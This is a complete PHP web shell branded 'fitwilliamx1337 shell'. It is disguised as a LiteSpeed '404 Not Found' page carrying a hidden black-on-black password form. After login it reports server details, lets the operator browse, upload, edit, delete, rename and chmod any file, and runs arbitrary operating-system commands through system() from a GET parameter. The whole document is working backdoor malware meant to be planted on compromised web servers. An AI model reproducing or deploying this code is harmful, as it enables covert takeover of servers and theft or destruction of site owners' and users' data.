<?php
session_start();

$correctPasswordHash = '202cb962ac59075b964b07152d234b70'; // 123

if (isset($_POST['password'])) {
    $enteredPassword = $_POST['password'];
    if (md5($enteredPassword) === $correctPasswordHash) {
        $_SESSION['authenticated'] = true;
    } else {
        echo '<p style="color: black; font: 2; position: fixed; bottom: 60px; right: 10px;"></p>';
    }
}

if (!isset($_SESSION['authenticated'])) {
    header('HTTP/1.1 404 Not Found');
    echo '<!DOCTYPE html>
    <html style="height:100%">
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <title>404 Not Found</title>
        <style>
            body {
                background-color: #000;
                color: #000000;
            }
            @media (prefers-color-scheme:dark){body{background-color:#000!important}}
            input[type="password"] {
                color: #000;
                background-color: #000000;
                border: 1px solid #000000;
                caret-color: #000;
            }
            input[type="password"]::placeholder {
                color: #000;
            }
            input[type="password"]:focus {
                outline: 2px solid #000000;
                box-shadow: 0 0 0 3px rgb(5, 5, 5);
                color: #000;
                background-color: #000000;
            }
        </style>
    </head>
    <body style="color: #000000; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #000;">
    <div style="height:auto; min-height:100%;">
        <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
            <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;"><font color="#444">404</font></h1>
            <h2 style="margin-top:20px;font-size: 30px;"><font color="#444">Not Found</font></h2>
            <p><font color="#444">The resource requested could not be found on this server!</font></p>
            <form method="post" style="margin-top:20px;">
                <div style="margin-bottom:8px;"><font color="#000">Enter Password</font></div>
                <input type="password" name="password" placeholder="Enter password" style="padding: 10px 12px; font-size: 14px; border: 1px solid #000000; border-radius: 4px; width: 260px; background-color: #000000; color: #000; caret-color: #000;" required>
                <input type="submit" value="Submit" style="margin-left: 10px; padding: 10px 16px; font-size: 14px; border: 1px solid #000000; border-radius: 4px; cursor: pointer; background-color: #000000; color: #000;">
            </form>
        </div>
    </div>
    <div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.0);box-shadow: 0 1px rgba(0, 0, 0, 0.0) inset;">
        <br>Proudly powered by LiteSpeed Web Server
        <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
    </div>
    </body>
    </html>';
    exit;
}

$requestedDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
if (!is_dir($requestedDir)) {
    $requestedDir = __DIR__;
}
$currentDir = realpath($requestedDir) ?: $requestedDir;

function deleteDirectory($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

function getPermissionString($path) {
    if (!file_exists($path)) {
        return '000';
    }

    $perms = fileperms($path);
    $octal = decoct($perms & 0777);
    return str_pad($octal, 3, '0', STR_PAD_LEFT);
}

function isValidChmodValue($value) {
    return preg_match('/^[0-7]{3}$/', $value) === 1;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>fitwilliamx1337 shell</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background-color: black;
            color: white;
            padding: 20px;
        }
        a {
            color: lightblue;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        h1, h2 {
            font-size: 20px;
        }
        p {
            font-size: 12px;
        }
        input[type="text"], input[type="submit"], input[type="file"] {
            font-size: 12px;
        }
        .directory-path {
            margin-bottom: 10px;
            padding: 10px;
            background-color: transparent;
            border: 1px solid white;
            border-radius: 5px;
            display: inline-block;
            color: white;
        }
        .directory-contents {
            padding: 10px;
            background-color: transparent;
            border: 1px solid white;
            border-radius: 5px;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
            width: 90%;
            margin-top: 10px;
            color: white;
        }
        .file-item {
            margin: 5px 0;
        }
        .file-item a {
            color: lightblue;
        }
        h2 {
            font-size: 13px;
        }
        .file-actions {
            font-size: 12px;
            color: yellow;
        }
        .chmod-link {
            color: blue;
            font-weight: bold;
        }
        .system-info {
            background-color: #333;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            color: white;
            font-size: 12px;
        }
        .status-on {
            color: lime;
        }
        .status-off {
            color: red;
        }
        .file-list {
            padding: 10px;
            background-color: #222;
            border: 1px solid white;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>fitwilliamx1337 shell  |   <a href="https://instagram.com/fitwilliamx1337">> Contact me < </a><br>
    <!-- System Information Section -->
    <div class="system-info">
        <p><strong>SERVER IP:</strong> <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unavailable'; ?></p>
        <p><strong>YOUR IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
        <p><strong>WEB SERVER:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
        <p><strong>SYSTEM:</strong> <?php echo php_uname(); ?></p>
        <?php
        $totalSpace = disk_total_space("/");
        $freeSpace = disk_free_space("/");
        $usedSpace = $totalSpace - $freeSpace;
        $totalSpaceGB = number_format($totalSpace / 1073741824, 2); // Convert to GB
        $freeSpaceGB = number_format($freeSpace / 1073741824, 2); // Convert to GB
        $usedSpaceGB = number_format($usedSpace / 1073741824, 2); // Convert to GB

        echo "<p><strong>HDD:</strong> $freeSpaceGB GB / $totalSpaceGB GB (Free: $freeSpaceGB GB)</p>";
        ?>
        <p><strong>PHP VERSION:</strong> <?php echo phpversion(); ?></p>
        <p><strong>DISABLE FUNC:</strong> <?php echo ini_get('disable_functions') ? ini_get('disable_functions') : 'None'; ?></p>
        <p>
           <strong>MySQL:</strong> <span class="<?php echo extension_loaded('mysqli') ? 'status-on' : 'status-off'; ?>"> <?php echo extension_loaded('mysqli') ? 'ON' : 'OFF'; ?></span> | 
           <strong>cURL:</strong> <span class="<?php echo extension_loaded('curl') ? 'status-on' : 'status-off'; ?>"> <?php echo extension_loaded('curl') ? 'ON' : 'OFF'; ?></span> | 
           <strong>WGET:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('wget --version')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('wget --version')) ? 'ON' : 'OFF'; ?></span> | 
           <strong>Perl:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('perl -v')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('perl -v')) ? 'ON' : 'OFF'; ?></span> | 
           <strong>Python:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('python --version')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('python --version')) ? 'ON' : 'OFF'; ?></span>
        </p>
    </div>
    <h2>Upload File</h2>
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars(isset($currentDir) ? $currentDir : __DIR__, ENT_QUOTES, 'UTF-8'); ?>">
        <input type="file" name="file_upload" required>
        <input type="submit" value="Upload">
    </form>
    <?php
    // FUNGSI UPLOAD YANG DIPERBAIKI
    if (isset($_FILES['file_upload'])) {
        $uploadDir = isset($_POST['current_dir']) && !empty($_POST['current_dir']) ? $_POST['current_dir'] : __DIR__;
        $uploadDir = str_replace("\0", '', $uploadDir);

        if (!is_dir($uploadDir)) {
            if (!@mkdir($uploadDir, 0777, true)) {
                echo '<p style="color: red;">Upload Error: Destination directory does not exist and could not be created.</p>';
            } else {
                echo '<p style="color: orange;">Directory created: ' . htmlspecialchars($uploadDir, ENT_QUOTES, 'UTF-8') . '</p>';
            }
        }

        if ($realUploadDir = realpath($uploadDir)) {
            $uploadDir = $realUploadDir;
        }

        if (!is_dir($uploadDir)) {
            echo '<p style="color: red;">Upload Error: Invalid upload directory.</p>';
        } elseif (!is_writable($uploadDir)) {
            echo '<p style="color: red;">Upload Error: Directory is not writable.</p>';
        } else {
            $fileName = basename($_FILES['file_upload']['name']);
            $safeName = preg_replace('/[^A-Za-z0-9._-]/', '_', $fileName);
            if ($safeName === '') {
                $safeName = 'uploaded_file_' . time();
            }
            if ($safeName !== $fileName) {
                echo '<p style="color: orange;">Filename sanitized to: ' . htmlspecialchars($safeName, ENT_QUOTES, 'UTF-8') . '</p>';
            }

            $targetPath = rtrim($uploadDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $safeName;
            $counter = 1;
            while (file_exists($targetPath)) {
                $info = pathinfo($safeName);
                $baseName = $info['filename'];
                $extension = isset($info['extension']) ? '.' . $info['extension'] : '';
                $safeName = $baseName . '_' . $counter . $extension;
                $targetPath = rtrim($uploadDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $safeName;
                $counter++;
            }

            if (isset($_FILES['file_upload']['tmp_name']) && is_uploaded_file($_FILES['file_upload']['tmp_name']) && $_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
                if (@move_uploaded_file($_FILES['file_upload']['tmp_name'], $targetPath)) {
                    echo '<p style="color: lime;">File uploaded successfully: ' . htmlspecialchars($safeName, ENT_QUOTES, 'UTF-8') . '</p>';
                } elseif (@copy($_FILES['file_upload']['tmp_name'], $targetPath)) {
                    @unlink($_FILES['file_upload']['tmp_name']);
                    echo '<p style="color: lime;">File uploaded successfully using fallback copy: ' . htmlspecialchars($safeName, ENT_QUOTES, 'UTF-8') . '</p>';
                } else {
                    echo '<p style="color: red;">Upload failed. Could not move file to destination. Check directory permissions, file name, or PHP upload settings.</p>';
                }
            } else {
                $error = isset($_FILES['file_upload']['error']) ? $_FILES['file_upload']['error'] : 'No file uploaded.';
                $errorMessages = [
                    UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
                    UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
                    UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
                    UPLOAD_ERR_NO_FILE => 'No file was uploaded',
                    UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary directory',
                    UPLOAD_ERR_CANT_WRITE => 'Cannot write to disk',
                    UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
                ];
                $errorMsg = isset($errorMessages[$error]) ? $errorMessages[$error] : 'Unknown error';
                echo '<p style="color: red;">Upload failed. Error: ' . htmlspecialchars($errorMsg, ENT_QUOTES, 'UTF-8') . '</p>';
            }
        }
    }
    ?>
    <h2>Lokasi Directory</h2>
    <div class="directory-path">
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, $currentDir);
        $path = '';
        foreach ($parts as $key => $part) {
            if ($key == 0 && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                $path = $part . DIRECTORY_SEPARATOR;
                echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
            } else {
                $path .= $part . DIRECTORY_SEPARATOR;
                echo ' / <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        ?>
    </div>
    <h2>Buat Directory</h2>
    <form method="POST">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8'); ?>">
        <input type="text" name="new_dir" placeholder="Enter new directory name" required>
        <input type="submit" name="create_dir" value="Create">
    </form>
    <?php
    if (isset($_POST['create_dir']) && !empty($_POST['new_dir'])) {
        $newDirPath = rtrim($_POST['current_dir'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $_POST['new_dir'];
        if (mkdir($newDirPath)) {
            echo '<p style="color: lime;">Directory created successfully: ' . htmlspecialchars($_POST['new_dir']) . '</p>';
        } else {
            echo '<p style="color: red;">Failed to create directory: ' . htmlspecialchars($_POST['new_dir']) . '</p>';
        }
    }
    ?>
    <h2>Directory List</h2>
    <?php
    $files = scandir($currentDir);
    $directories = [];
    $filesList = [];
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            $directories[] = $file;
        } else {
            $filesList[] = $file;
        }
    }

    // Tampilkan direktori di barisan atas
    echo '<div class="directory-contents">';
    foreach ($directories as $dir) {
        $dirPath = $currentDir . DIRECTORY_SEPARATOR . $dir;
        $dirPerm = getPermissionString($dirPath);
        echo '<div class="file-item">';
        echo '[DIR] <a href="?dir=' . urlencode($dirPath) . '">' . htmlspecialchars($dir) . '</a>' .
             '  | Perm: ' . htmlspecialchars($dirPerm) .
             '  | <a href="?delete_dir=' . urlencode($dirPath) . '" style="color: red;">Delete</a>' .
             '  | <a href="?rename_dir=' . urlencode($dirPath) . '" style="color: yellow;">Rename</a>' .
             '  | <a href="?chmod=' . urlencode($dirPath) . '" class="chmod-link">Chmod</a>';
        echo '</div>';
    }
    echo '</div>';
    ?>
    <h2>File List</h2>
    <?php
    // Tampilkan file di barisan bawah
    echo '<div class="file-list">';
    foreach ($filesList as $file) {
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
        $fileSize = is_file($filePath) ? filesize($filePath) : '-';
        $fileModified = date("Y-m-d H:i:s", filemtime($filePath));
        $filePerm = getPermissionString($filePath);
        echo '<div class="file-item">';
        echo '[FILE] ' . htmlspecialchars($file) . ' | Size: ' . $fileSize . ' bytes | Modified: ' . $fileModified .
             ' | Perm: ' . htmlspecialchars($filePerm) .
             '  | <a href="?view=' . urlencode($filePath) . '">View</a>' .
             '  | <a href="?edit=' . urlencode($filePath) . '">Edit</a>' .
             '  | <a href="?delete=' . urlencode($filePath) . '" style="color: red;">Delete</a>' .
             '  | <a href="?rename=' . urlencode($filePath) . '" style="color: yellow;">Rename</a>' .
             '  | <a href="?chmod=' . urlencode($filePath) . '" class="chmod-link">Chmod</a>';
        echo '</div>';
    }
    echo '</div>';
    ?>

    <!-- Fungsi Delete, Rename, View, dan Edit -->
    <?php
    // Chmod File/Directory
    if (isset($_GET['chmod'])) {
        $chmodPath = $_GET['chmod'];
        if (file_exists($chmodPath)) {
            $currentMode = getPermissionString($chmodPath);
            if (isset($_POST['chmod_path']) && isset($_POST['chmod_value'])) {
                $newMode = $_POST['chmod_value'];
                if (isValidChmodValue($newMode)) {
                    if (chmod($chmodPath, octdec($newMode))) {
                        echo '<p style="color: lime;">Permissions updated successfully to ' . htmlspecialchars($newMode) . ' for ' . htmlspecialchars(basename($chmodPath)) . '</p>';
                    } else {
                        echo '<p style="color: red;">Failed to change permissions.</p>';
                    }
                } else {
                    echo '<p style="color: red;">Invalid permission value. Use 000 to 777.</p>';
                }
            }

            echo '<h2>Chmod: ' . htmlspecialchars(basename($chmodPath)) . '</h2>';
            echo '<p>Current mode: <strong>' . htmlspecialchars($currentMode) . '</strong> (octal)</p>';
            echo '<form method="POST">';
            echo '<input type="hidden" name="chmod_path" value="' . htmlspecialchars($chmodPath, ENT_QUOTES, 'UTF-8') . '">';
            echo '<input type="text" name="chmod_value" value="' . htmlspecialchars($currentMode) . '" maxlength="3" pattern="[0-7]{3}" required style="width: 60px; font-family: monospace;">';
            echo ' <input type="submit" value="Apply">';
            echo '</form>';
            echo '<p style="color: #4da3ff;">Use a 3-digit octal value from 000 to 777, for example 755 or 644.</p>';
            echo '<p><a href="?dir=' . urlencode($currentDir) . '">Back to File List</a></p>';
        }
    }

    // Delete Directory
    if (isset($_GET['delete_dir'])) {
        $deleteDirPath = $_GET['delete_dir'];
        if (is_dir($deleteDirPath)) {
            if (deleteDirectory($deleteDirPath)) {
                echo '<p style="color: lime;">Directory deleted successfully: ' . htmlspecialchars(basename($deleteDirPath)) . '</p>';
            } else {
                echo '<p style="color: red;">Failed to delete directory: ' . htmlspecialchars(basename($deleteDirPath)) . '</p>';
            }
        }
        echo '<p><a href="?dir=' . urlencode($currentDir) . '">Back to current directory</a></p>';
    }

    // Rename Directory
    if (isset($_GET['rename_dir'])) {
        $renameDirPath = $_GET['rename_dir'];
        if (is_dir($renameDirPath)) {
            echo '<h2>Rename Directory: ' . htmlspecialchars(basename($renameDirPath)) . '</h2>';
            if (isset($_POST['new_dir_name'])) {
                $newDirName = $_POST['new_dir_name'];
                $newDirPath = dirname($renameDirPath) . DIRECTORY_SEPARATOR . $newDirName;
                if (rename($renameDirPath, $newDirPath)) {
                    echo '<p style="color: lime;">Directory renamed successfully to: ' . htmlspecialchars($newDirName) . '</p>';
                } else {
                    echo '<p style="color: red;">Failed to rename directory.</p>';
                }
            }
            echo '<form method="POST">';
            echo '<input type="hidden" name="current_dir" value="' . htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8') . '">';
            echo '<input type="text" name="new_dir_name" placeholder="Enter new directory name" required>';
            echo '<input type="submit" value="Rename">';
            echo '</form>';
            echo '<p><a href="?dir=' . urlencode($currentDir) . '">Back to current directory</a></p>';
        }
    }

    // Rename File
    if (isset($_GET['rename'])) {
        $renameFilePath = $_GET['rename'];
        if (is_file($renameFilePath)) {
            echo '<h2>Rename File: ' . htmlspecialchars(basename($renameFilePath)) . '</h2>';
            if (isset($_POST['new_file_name'])) {
                $newFileName = $_POST['new_file_name'];
                $newFilePath = dirname($renameFilePath) . DIRECTORY_SEPARATOR . $newFileName;
                if (rename($renameFilePath, $newFilePath)) {
                    echo '<p style="color: lime;">File renamed successfully to: ' . htmlspecialchars($newFileName) . '</p>';
                } else {
                    echo '<p style="color: red;">Failed to rename file.</p>';
                }
            }
            echo '<form method="POST">';
            echo '<input type="hidden" name="current_dir" value="' . htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8') . '">';
            echo '<input type="text" name="new_file_name" placeholder="Enter new file name" required>';
            echo '<input type="submit" value="Rename">';
            echo '</form>';
            echo '<p><a href="?dir=' . urlencode($currentDir) . '">Back to File List</a></p>';
        }
    }

    // Delete File
    if (isset($_GET['delete'])) {
        $deletePath = $_GET['delete'];
        if (is_file($deletePath) && unlink($deletePath)) {
            echo '<p style="color: lime;">File deleted successfully: ' . htmlspecialchars(basename($deletePath)) . '</p>';
        } else {
            echo '<p style="color: red;">Failed to delete file: ' . htmlspecialchars(basename($deletePath)) . '</p>';
        }
        echo '<p><a href="?dir=' . urlencode($currentDir) . '">Back to File List</a></p>';
    }

    // File Viewing
    if (isset($_GET['view'])) {
        $viewPath = $_GET['view'];
        if (is_file($viewPath)) {
            echo '<h2>View File: ' . htmlspecialchars(basename($viewPath)) . '</h2>';
            echo '<pre style="background-color: #1a1a1a; padding: 10px; border-radius: 5px; overflow-x: auto;">' . htmlspecialchars(file_get_contents($viewPath)) . '</pre>';
            echo '<p><a href="?dir=' . urlencode(dirname($viewPath)) . '">Back to File List</a></p>';
        }
    }

    // File Editing
    if (isset($_GET['edit'])) {
        $editPath = $_GET['edit'];
        if (is_file($editPath)) {
            if (isset($_POST['edit_path']) && isset($_POST['content'])) {
                $postEditPath = $_POST['edit_path'];
                if (is_file($postEditPath)) {
                    if (file_put_contents($postEditPath, $_POST['content'])) {
                        echo '<p style="color: lime;">File saved successfully.</p>';
                    } else {
                        echo '<p style="color: red;">Failed to save file.</p>';
                    }
                }
            }
            
            echo '<h2>Edit File: ' . htmlspecialchars(basename($editPath)) . '</h2>';
            $fileContent = file_get_contents($editPath);
            echo '<form method="POST">';
            echo '<input type="hidden" name="edit_path" value="' . htmlspecialchars($editPath, ENT_QUOTES, 'UTF-8') . '">';
            echo '<textarea name="content" rows="20" cols="80" style="width: 90%; padding: 5px; font-family: monospace;">' . htmlspecialchars($fileContent) . '</textarea><br><br>';
            echo '<input type="submit" value="Save" style="padding: 8px 15px; font-size: 14px;">';
            echo '</form>';
            echo '<p><a href="?dir=' . urlencode(dirname($editPath)) . '">Back to File List</a></p>';
        }
    }
    ?>
    <h2>CMD [ Linux ]</h2>
    <form method="GET">
        <input type="text" name="cmd" autofocus size="80" placeholder="Enter command (e.g., ls -la)">
        <input type="submit" value=">>>">
    </form>
    <pre>
    <?php
    if (!empty($_GET['cmd'])) {
        $command = $_GET['cmd'];
        echo "Command: " . $command . "\n\n";
        // Run Linux Command
        system($command . ' 2>&1');
    }
    ?>
    </pre>
</body>
</html>
